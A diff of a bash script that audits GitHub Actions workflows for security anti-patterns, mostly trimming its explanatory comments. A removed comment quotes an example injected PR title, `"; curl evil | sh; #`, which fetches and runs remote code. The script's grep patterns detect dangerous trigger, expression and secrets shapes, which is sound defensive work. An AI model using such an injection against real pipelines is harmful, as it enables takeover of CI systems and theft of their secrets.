@@ -19,12 +19,9 @@
 # HONEST LIMITATION. This is a line-oriented scan, not a YAML parser: it reads
 # what a workflow SAYS, and it can be fooled by an unusual layout, a composite
 # action outside `.github/actions/`, a composite that shells out to a script file,
-# or a reusable workflow called with `secrets: inherit`. Composites ARE read as of
-# 2026-09-22, but only for rules 2 (expression injection) and 3 (unpinned `uses:`):
-# rules 1, 4, 5 and 6 are about a workflow's triggers, top-level `permissions:` and
-# runner, none of which a composite has, so applying them there would warn on every
-# composite in existence. Treat a clean run as "none of the known shapes are
-# present in these files", never as "this pipeline is safe".
+# or a reusable workflow called with `secrets: inherit`. Composites get rules 2 and 3 only.
+# Treat a clean run as "none of the known shapes are present in these files", never as "this pipeline is safe".
+# Why, limits, history: rationale/derivations/plugin-devops.md § plugins/devops/scripts/workflow-audit.sh
 set -u
 
 dir=".github/workflows"
@@ -51,23 +48,16 @@ finding() { # severity file line rule detail
 
 shopt -s nullglob 2>/dev/null || true
 files=$(find "$dir" -maxdepth 1 -type f \( -name '*.yml' -o -name '*.yaml' \) 2>/dev/null | sort)
-# Second root: composite actions live beside the workflows dir, one per directory. A
-# composite runs with the CALLING workflow's token, so an injected expression in its
-# `run:` is the same critical shape — it was simply never read here.
+# Second root: a composite action runs with the calling workflow's token, so an injected `run:` expression there is the same critical shape.
 actdir="$(dirname "$dir")/actions"
 cfiles=$(find "$actdir" -maxdepth 2 -type f \( -name 'action.yml' -o -name 'action.yaml' \) 2>/dev/null | sort)
 [ -n "$files$cfiles" ] || { say "workflow-audit: no workflow files in $dir"; exit 3; }
 
 for wf in $files $cfiles; do
-  # Composite or workflow? Rules 1, 4, 5 and 6 read triggers, top-level permissions: and
-  # runs-on — fields a composite does not have — so they stay workflow-only.
+  # Rules 1, 4, 5 and 6 read triggers, top-level permissions: and runs-on, which a composite lacks: workflow-only.
   composite=0
   case " $cfiles " in *" $wf "*) composite=1 ;; esac
-  # 1. CRITICAL — pull_request_target / workflow_run that checks out a ref.
-  #    The trigger runs with the BASE repo's secrets and a write token; checking
-  #    out the PR head then executes fork-authored code inside that context. This
-  #    is GitHub's own documented critical anti-pattern and it reads, to a
-  #    reviewer skimming for correctness, as "checks out the PR — correct".
+  # 1. CRITICAL — pull_request_target / workflow_run checking out the PR head runs fork code with the base repo's secrets and a write token.
   if [ "$composite" -eq 0 ] && grep -qE '^[[:space:]]*(pull_request_target|workflow_run):' "$wf"; then
     ln=$(grep -nE '^[[:space:]]*(pull_request_target|workflow_run):' "$wf" | head -1 | cut -d: -f1)
     if grep -qE '^[[:space:]]*ref:[[:space:]]*\$\{\{[[:space:]]*github\.event\.(pull_request\.head|workflow_run\.head)' "$wf" \
@@ -82,16 +72,7 @@ for wf in $files $cfiles; do
     fi
   fi
 
-  # 2. CRITICAL — an ATTACKER-CONTROLLED expression interpolated into a run:
-  #    block. The value is substituted into the shell before it runs, so a PR
-  #    title of `"; curl evil | sh; #` is command execution, not a string.
-  #
-  #    Matched by LEAF, not by prefix. `github.event.pull_request.*` as a whole is
-  #    the wrong unit: `base.sha` and `number` are GitHub-generated and safe, and
-  #    flagging them makes the rule cry wolf on ordinary CI — which is how a gate
-  #    gets switched off. Only fields a PR author can type are listed. (Found by
-  #    running this against its own repo: the first draft flagged
-  #    `${{ github.event.pull_request.base.sha }}`, a 40-char SHA nobody controls.)
+  # 2. CRITICAL — an attacker-controlled expression in a run: block is substituted into the shell; matched by LEAF (fields a PR author can type), so `base.sha` stays quiet.
   while IFS=: read -r ln _; do
     [ -n "$ln" ] || continue
     finding critical "$wf" "$ln" \
@@ -103,9 +84,7 @@ for wf in $files $cfiles; do
     /^[[:space:]]*(uses|with|env|if|name):/ { inrun=0 }
   ' "$wf")
 
-  # 3. WARN — third-party action pinned to a mutable tag. devops-practices already
-  #    teaches no-`latest` for base images; a git tag is equally mutable and the
-  #    action runs with the job's full token.
+  # 3. WARN — a third-party action on a mutable tag runs with the job's full token.
   while IFS= read -r line; do
     [ -n "$line" ] || continue
     ln="${line%%:*}"; ref="${line#*:}"
@@ -118,14 +97,12 @@ for wf in $files $cfiles; do
   done < <(grep -nE '^[[:space:]]*-?[[:space:]]*uses:[[:space:]]*[^ ]+' "$wf" \
            | sed -E 's/^([0-9]+):[[:space:]]*-?[[:space:]]*uses:[[:space:]]*/\1:/' | sed 's/[[:space:]]*$//')
 
-  # 4. WARN — no top-level permissions:. Without it the job inherits the repo
-  #    default, which on many repos is still write-all.
+  # 4. WARN — no top-level permissions: the job inherits the repo default, on many repos still write-all.
   [ "$composite" -eq 1 ] || grep -qE '^permissions:' "$wf" || finding warn "$wf" 1 \
     "no top-level permissions: block" \
     "The job inherits the repository default token scope. Declare 'permissions: contents: read' at the top and widen per job only where needed."
 
-  # 5. WARN — self-hosted runner on a fork-reachable trigger. A fork PR then runs
-  #    on infrastructure the repo owns, with whatever state the last job left.
+  # 5. WARN — a self-hosted runner on a fork-reachable trigger runs fork code on owned infrastructure.
   if [ "$composite" -eq 0 ] && grep -qE '^[[:space:]]*runs-on:.*self-hosted' "$wf" \
      && grep -qE '^[[:space:]]*(pull_request|pull_request_target):' "$wf"; then
     ln=$(grep -nE '^[[:space:]]*runs-on:.*self-hosted' "$wf" | head -1 | cut -d: -f1)
@@ -134,8 +111,7 @@ for wf in $files $cfiles; do
       "Fork-authored code executes on your infrastructure and can read anything the previous job left behind. Use an ephemeral runner, or gate the job on the PR being same-repo."
   fi
 
-  # 6. WARN — script injection's quieter cousin: secrets used in a job whose
-  #    trigger a fork can reach.
+  # 6. WARN — script injection's quieter cousin: secrets used in a job whose trigger a fork can reach.
   if [ "$composite" -eq 0 ] && grep -qE '^[[:space:]]*pull_request_target:' "$wf" && grep -qE '\$\{\{[[:space:]]*secrets\.' "$wf"; then
     ln=$(grep -nE '\$\{\{[[:space:]]*secrets\.' "$wf" | head -1 | cut -d: -f1)
     finding warn "$wf" "$ln" \
